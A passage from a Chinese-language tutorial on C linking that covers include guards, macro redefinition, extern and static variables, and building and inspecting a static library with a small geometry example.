<p>这两个头文件是包含关系,完全可以只<code>#include &lt;cstdio&gt;</code>,但是这时<code>#include &lt;stdio.h&gt;</code>之后再<code>#include &lt;cstdio&gt;</code>时,会引入<code>&lt;cstdio&gt;</code>中除了包含的的<code>&lt;stdio.h&gt;</code>之外的其他内容.当然,如果再引入一遍<code>&lt;stdio.h&gt;</code>也不会报错,因为都是引用</p>
<p>但是有时候去重的作用就很重要,比如<code>"a.h"</code>中会<code>#include "b.h"</code>同理<code>"b.h"</code>会<code>#include "a.h"</code>,即两个头文件会互相引入,如果此时不使用条件展开去重,则预编译器会不停引入两个文件,直到崩溃</p>
</blockquote>
</blockquote>
<h6 id="正确写法-1">正确写法</h6>
<h6 id="方法一宏定义pi">方法一:宏定义PI</h6>
<p>在<code>geometry.h</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GEOMETRY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GEOMETRY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.1415926</span></span><br><span class="line">....</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这也是glibc库的头文件中使用的方法</p>
<p>比如<code>stdio.h</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZ 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NFILE _NSTREAM_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NSTREAM_ 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IOB_ENTRIES 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EOF (-1)</span></span><br></pre></td></tr></table></figure>
<p>我们自己写一个<code>main.c</code>,<code>#include &lt;stdio.h&gt;</code>之后就可以直接使用这些宏定义</p>
</blockquote>
<blockquote>
<p>为什么可以使用宏定义呢?</p>
<p>各组成模块宏定义展开之后可能会有多条同样的宏定义,宏定义允许多次定义,在调用时使用最后一次的宏定义</p>
<p>比如</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.1416</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.1415926</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; PI;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.14159</span><br></pre></td></tr></table></figure>
<p>但是会报告编译警告</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">testGlobal.c:3: warning: <span class="string">&quot;PI&quot;</span> redefined</span><br><span class="line">    3 | <span class="comment">#define PI 3.142</span></span><br><span class="line">      |</span><br><span class="line">testGlobal.c:2: note: this is the location of the previous definition</span><br><span class="line">    2 | <span class="comment">#define PI 3.14</span></span><br><span class="line">      |</span><br><span class="line">testGlobal.c:4: warning: <span class="string">&quot;PI&quot;</span> redefined</span><br><span class="line">    4 | <span class="comment">#define PI 3.1416</span></span><br><span class="line">      |</span><br><span class="line">testGlobal.c:3: note: this is the location of the previous definition</span><br><span class="line">    3 | <span class="comment">#define PI 3.142</span></span><br><span class="line">      |</span><br><span class="line">testGlobal.c:5: warning: <span class="string">&quot;PI&quot;</span> redefined</span><br><span class="line">    5 | <span class="comment">#define PI 3.14159</span></span><br><span class="line">      |</span><br><span class="line">testGlobal.c:4: note: this is the location of the previous definition</span><br><span class="line">    4 | <span class="comment">#define PI 3.1416</span></span><br><span class="line">      |</span><br></pre></td></tr></table></figure>
<p>而如果多次宏定义一模一样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14</span></span><br></pre></td></tr></table></figure>
<p>则不会报告编译警告</p>
</blockquote>
<h6 id="方法二使用extern引用">方法二:使用extern引用</h6>
<p>比如在<code>point.c</code>中全局位置写入<code>const double PI=3.1415926;</code></p>
<p><code>main</code>函数中要使用<code>PI</code>值,那么在<code>main.c</code>中找一个使用<code>PI</code>之前的位置(不管是局部还是全局位置),<code>extern double PI;</code></p>
<p>作用是,声明一下<code>PI</code>是一个外部符号(本模块中妹有定义),编译时产生一个引用,至于引用的解析,让链接器去找</p>
<blockquote>
<p>实际上用<code>extern</code>声明一个变量和声明一个函数引用的作用是类似的,都是声明引用.</p>
<p>但是为啥函数引用不用<code>extern</code>声明,但是变量就一定得用<code>extern</code>声明呢?</p>
<p>函数只要不写函数体,在参数表小括号后面一个分号,立刻就可以断定这是一个函数引用.</p>
<p>而全局变量即使不赋值直接写分号,<code>int a;</code>编译器就认为这是一个应该放在.bss节的本模块中的数据.为了突出是个引用,因此使用<code>extern</code>关键字</p>
</blockquote>
<blockquote>
<p>extern的作用</p>
<p>如果一个程序这样写</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">double</span> PI;			<span class="comment">//试图声明一个引用,并在main函数之后赋值</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; PI;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> PI = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure>
<p>会报错<code>[注解] 'double PI' previously 被声明于此处</code>.同一个模块中存在多重定义了</p>
<p>正确的写法应该是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">double</span> PI;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; PI;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> PI = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure>
<p>运行结果:<code>3.14</code></p>
<p>对于函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>;<span class="comment">//这两种写法都可以</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	func();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;		<span class="comment">//实现</span></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;helloworld&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;fcntl.h&gt;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">open</span> <span class="params">(__const <span class="type">char</span> *__file, <span class="type">int</span> __oflag, ...)</span> __<span class="title function_">nonnull</span> <span class="params">((<span class="number">1</span>))</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<h6
id="extern-double-pi能否写入头文件"><code>extern double PI;</code>能否写入头文件</h6>
<p>既然可以将<code>extern double PI;</code>写入<code>main.c</code>,那么写入<code>geometry.h</code>不一样吗?被<code>main.c</code>引入之后不就相当于在<code>main.c</code>中写了这句吗</p>
<p>这样写可以通过编译链接,感觉上妹有问题,但是用CLion搜索了整个glibc库,所有头文件中都没有这么写,只在<code>configure.in</code>中有这么一句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> glibc_conftest_frobozz;</span><br></pre></td></tr></table></figure>
<h5 id="静态变量">静态变量</h5>
<p>静态变量的作用是,将"全局位置"的变量的访问权限限定在本模块中.</p>
<p>啥意思呢?</p>
<p><code>point.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;geometry.h&quot;</span></span></span><br><span class="line"><span class="comment">//全局位置</span></span><br><span class="line"><span class="comment">//const double PI=3.1415926;					//真·全局变量</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">double</span> PI=<span class="number">3.1415926</span>;				<span class="comment">//假·全局变量</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>被<code>static</code>修饰的变量即使放在本模块的"全局位置",也是相对于本模块中的函数而言的"全局位置"</p>
<p>此时如果在<code>main.c</code>中想要使用<code>PI</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;geometry.h&quot;</span></span></span><br><span class="line">....</span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">double</span> PI;			<span class="comment">//声明PI引用,让链接器去解析</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">....</span><br><span class="line">    <span class="type">int</span> pi=PI;				<span class="comment">//试图使用引用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然而此时会报链接错</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/linkage]</span><br><span class="line">└─$ ./makedynamiclib.sh</span><br><span class="line">/usr/bin/ld: /tmp/ccSIplb4.o: warning: relocation against `PI<span class="number">&#x27;</span> in read-only section `.text<span class="number">&#x27;</span></span><br><span class="line">/usr/bin/ld: /tmp/ccSIplb4.o: in function `main<span class="number">&#x27;</span>:</span><br><span class="line">main.c:(.text+<span class="number">0xd7</span>): undefined reference to `PI<span class="number">&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>static修饰的变量就类似于java和C++中<code>private</code>修饰的变量</p>
<p>只不过static限制模块之间的访问权限</p>
<p><code>private</code>限制类之间的访问权限</p>
<p>这是两种编程范式,模块化编程和面向对象编程</p>
</blockquote>
<h3 id="静态库.a">静态库.a</h3>
<p>静态库<code>static library</code>实际上是一伙子可重定位目标模块<code>.o</code>的集合</p>
<h4 id="起源">起源</h4>
<p>现在假设我们一个工程有成百上千个目标模块<code>.o</code>,</p>
<p>在其中一个目标模块引用了其他若干个目标模块中的符号.</p>
<p>如果引用的其他目标模块不多,尚且看不出问题,只需要<code>gcc main.o module1.o module2. ... -o prog</code>即可完成链接</p>
<p>如果引用的其他目标模块成百上千,那么可以想象到<code>gcc main.o module1.o module2. ... -o prog</code>这条编译命令能有多长</p>
<p>"可以编写<code>makefile</code>完成链接"</p>
<p>即使用<code>makefile</code>,还是存在难以解决的问题</p>
<p><strong>引用的符号在哪个模块里,是在<code>module1.o</code>还是在<code>module2.o</code>?程序员记得住吗?每次编译都要查表吗?</strong></p>
<p><strong>静态库也是可重定位目标文件<code>.o</code>吗?</strong></p>
<p>最容易想到的是,将一些工具性质的,经常被调用的一些目标模块,编译成一个大目标模块<code>.o</code>,注意还是可重定位目标模块<code>.o</code></p>
<p>当程序员自己写一个源文件<code>test.c</code>并编译成目标模块<code>test.o</code>,其中要用到一些库函数时,只需要将刚才生成的大<code>.o</code>文件链接进来</p>
<p>诚如是,则链接时该包含成千上万函数的大<code>.o</code>文件将会在运行时全部加载进入进程的地址空间,即使<code>test.o</code>只引用到了一个或者几个函数.</p>
<blockquote>
<p>这就好比要去图书馆接一本书,却把图书馆整个儿搬回家了</p>
</blockquote>
<p>能不能真正像借书一样,用到哪本书拿哪本,用到一个函数就只加载该函数所在的模块?</p>
<p><strong>于是归档文件(archieve)<code>.a</code>产生了,即静态库</strong></p>
<blockquote>
<p><code>.o</code>可重定位目标模块可能是静态库.a的组成,也可能是源代码<code>test.c</code>编译后链接前的中间文件.也就是说,.o中有可能有程序的入口点<code>main</code>函数.</p>
<p><code>.a</code>作为一个库文件,只能起到支持的作用,它就相当于一个服务器被动地给客户端服务.也就是说,只有用户的程序中有入口点,.a是不会主动执行的.直接试图将静态库编译链接为可执行目标文件是不可能的,因为库中没有<code>main</code>函数</p>
</blockquote>
<h4
id="使用静态库ar-rcs-静态库名.a-组成目标1.o-组成目标2.o-....">使用静态库<code>ar rcs &lt;静态库名&gt;.a &lt;组成目标1&gt;.o &lt;组成目标2&gt;.o ....</code></h4>
<p>举一个比较有实际意义的例子,模拟平面几何中的点和线</p>
<p>工作目录下有五个文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# <span class="built_in">ls</span> -l</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 kali kali 731 May 25 21:57 geometry.h</span><br><span class="line">-rwxrwxrwx 1 kali kali 667 May 25 22:02 line.c</span><br><span class="line">-rwxrwxrwx 1 kali kali 285 May 25 21:26 main.c</span><br><span class="line">-rwxrwxrwx 1 kali kali 520 May 25 21:57 point.c</span><br><span class="line">-rwxrwxrwx 1 kali kali 140 May 25 22:03 shellscript.sh</span><br></pre></td></tr></table></figure>
<h5 id="geometry.h"><code>geometry.h</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> GEOMETRY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GEOMETRY</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>		<span class="comment">//点结构体</span></span><br><span class="line">        <span class="type">double</span> x;</span><br><span class="line">        <span class="type">double</span> y;</span><br><span class="line">    &#125;Point;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">getEuclideanDistance</span><span class="params">(Point,Point)</span>;   <span class="comment">//计算两点之间的欧几里得距离</span></span><br><span class="line">    <span class="type">double</span> <span class="title function_">getManhattanDistance</span><span class="params">(Point,Point)</span>;   <span class="comment">//计算两点之间的曼哈顿距离</span></span><br><span class="line">    Point <span class="title function_">newPoint</span><span class="params">(<span class="type">double</span>,<span class="type">double</span>)</span>;      <span class="comment">//构造新点</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">showPoint</span><span class="params">(Point)</span>;              <span class="comment">//打印点坐标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>		<span class="comment">//线结构体</span></span><br><span class="line">        Point a;</span><br><span class="line">        Point b;</span><br><span class="line">    &#125;Line;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">getLength</span><span class="params">(Line)</span>;         <span class="comment">//计算线段长</span></span><br><span class="line">    <span class="type">double</span> <span class="title function_">getSlope</span><span class="params">(Line)</span>;          <span class="comment">//计算斜率</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">isParallel</span><span class="params">(Line,Line)</span>;      <span class="comment">//判断平行</span></span><br><span class="line">    Line <span class="title function_">newLine</span><span class="params">(Point,Point)</span>;      <span class="comment">//构造新线段</span></span><br><span class="line">    <span class="type">void</span> <span class="title function_">showLine</span><span class="params">(Line)</span>;			<span class="comment">//打印线两端点</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>这里面的函数声明被分在两个源文件实现,<code>point.c</code>实现有关点计算的函数,<code>line.c</code>实现有关线计算的函数</p>
<h5 id="point.c"><code>point.c</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;geometry.h&quot;</span>			<span class="comment">//引入符号</span></span></span><br><span class="line">    <span class="comment">// typedef struct&#123;</span></span><br><span class="line">    <span class="comment">//     double x;</span></span><br><span class="line">    <span class="comment">//     double y;</span></span><br><span class="line">    <span class="comment">// &#125;Point;</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">getEuclideanDistance</span><span class="params">(Point a,Point b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>((a.x-b.x)*(a.x-b.x)+(a.y-b.y)*(a.y-b.y));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">getManhattanDistance</span><span class="params">(Point a,Point b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(a.x-b.x)+<span class="built_in">abs</span>(a.y-b.y);</span><br><span class="line">&#125;</span><br><span class="line">Point <span class="title function_">newPoint</span><span class="params">(<span class="type">double</span> x,<span class="type">double</span> y)</span>&#123;</span><br><span class="line">    Point a;</span><br><span class="line">    a.x=x;</span><br><span class="line">    a.y=y;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">showPoint</span><span class="params">(Point p)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(%.2f,%.2f)&quot;</span>,p.x,p.y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="line.c"><code>line.c</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;geometry.h&quot;</span>			<span class="comment">//引入符号</span></span></span><br><span class="line">    <span class="comment">// typedef struct&#123;</span></span><br><span class="line">    <span class="comment">//     Point a;</span></span><br><span class="line">    <span class="comment">//     Point b;</span></span><br><span class="line">    <span class="comment">// &#125;Line;</span></span><br><span class="line">    <span class="type">double</span> <span class="title function_">getLength</span><span class="params">(Line L)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getEuclideanDistance(L.a,L.b);			<span class="comment">//此处要用到计算欧几里得距离的函数,其实现在point.c中</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">getSlope</span><span class="params">(Line L)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span>*(L.a.y-L.b.y)/(L.a.x-L.b.x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">isParallel</span><span class="params">(Line L1,Line L2)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">abs</span>(getSlope(L1)-getSlope(L2))&lt;<span class="number">0.001</span>;	<span class="comment">//控制精度为0.001</span></span><br><span class="line">    &#125;</span><br><span class="line">    Line <span class="title function_">newLine</span><span class="params">(Point a,Point b)</span>&#123;</span><br><span class="line">        Line L;</span><br><span class="line">        L.a=a;</span><br><span class="line">        L.b=b;</span><br><span class="line">        <span class="keyword">return</span> L;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> <span class="title function_">showLine</span><span class="params">(Line L)</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[(%.2f,%2f)(%.2f,%.2f)]&quot;</span>,L.a.x,L.a.y,L.b.x,L.b.y);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h5 id="main.c-1"><code>main.c</code></h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;geometry.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    Point a=newPoint(<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    Point b=newPoint(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="type">double</span> euclidean_distance=getEuclideanDistance(a,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;euclidean_distance=%.2f\n&quot;</span>,euclidean_distance);</span><br><span class="line">    showPoint(a);</span><br><span class="line">    showPoint(b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意<code>main</code>函数中只用到了和点有关的函数,与线有关的函数一个也妹有用到</p>
<p>下面编写<code>bash</code>脚本进行编译,制作静态库,链接,运行</p>
<h5 id="shellscript.sh"><code>shellscript.sh</code></h5>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc point.c -c -o point.o</span><br><span class="line">gcc line.c -c -o line.o</span><br><span class="line">ar rcs libgeometry.a point.o line.o				#创建静态库</span><br><span class="line"></span><br><span class="line">gcc -static main.c -L. -lgeometry -lm -o prog </span><br><span class="line">./prog</span><br></pre></td></tr></table></figure>
<p>执行该<code>shell</code>脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/linkage]</span><br><span class="line">└─# ./shellscript.sh</span><br><span class="line">euclidean_distance=2.83</span><br><span class="line">(4.00,5.00)(2.00,3.00)</span><br></pre></td></tr></table></figure>
<p>同时在工作目录下生成了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libgeometry.a</span><br><span class="line">line.o</span><br><span class="line">point.o</span><br><span class="line">prog</span><br></pre></td></tr></table></figure>
<p>这么几个文件</p>
<p>现在好奇的是,这个<code>libgeometry.a</code>到底有没有用啥拿啥的功能,也就是说,<code>line.o</code>有没有被链接进入可执行目标文件<code>prog</code>.用ida64打开<code>prog</code>,搜一下<code>function</code>看看<code>newLine</code>函数存不存在即可</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220525221037808.png"
alt="image-20220525221037808" />
<figcaption aria-hidden="true">image-20220525221037808</figcaption>
</figure>
<p>结果证明它不存在,也就是说<code>line.o</code>妹有链接进入<code>prog</code></p>
<p>还有就是<code>main</code>中妹有用到<code>point.c</code>中的<code>getManhattanDistance</code>函数,它有没有随着<code>point.o</code>一起被链接进入<code>prog</code>呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220525221208601.png"
alt="image-20220525221208601" />
<figcaption aria-hidden="true">image-20220525221208601</figcaption>
</figure>
<p>事实上是有的,也就是说,从归档文件<code>.a</code>中用啥拿啥是以模块为单位的,而不是以函数为单位的,</p>
<p>归档文件中的一个模块,不管有多少个函数,只要有其中之一被引用,该模块中的所有函数都会随着该模块链接进入可执行目标文件</p>
<h4 id="a如何链接"><code>.a</code>如何链接</h4>
<p>前面章节中符号解析重定位等等都是<code>.o</code>的链接方法.现在对于一个静态库<code>.a</code>,应该如何链接呢?</p>
